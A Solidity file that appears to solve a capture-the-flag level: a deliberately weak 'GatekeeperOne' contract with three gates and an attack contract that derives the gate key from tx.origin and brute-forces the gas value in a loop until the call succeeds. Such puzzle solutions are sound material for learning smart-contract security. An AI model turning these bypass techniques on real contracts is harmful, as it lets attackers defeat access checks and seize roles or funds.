// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | uint64(1) << 32);

        // Find the exact gas limit that will pass the gateTwo check
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{gas: 81910 + i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }   
    }
}       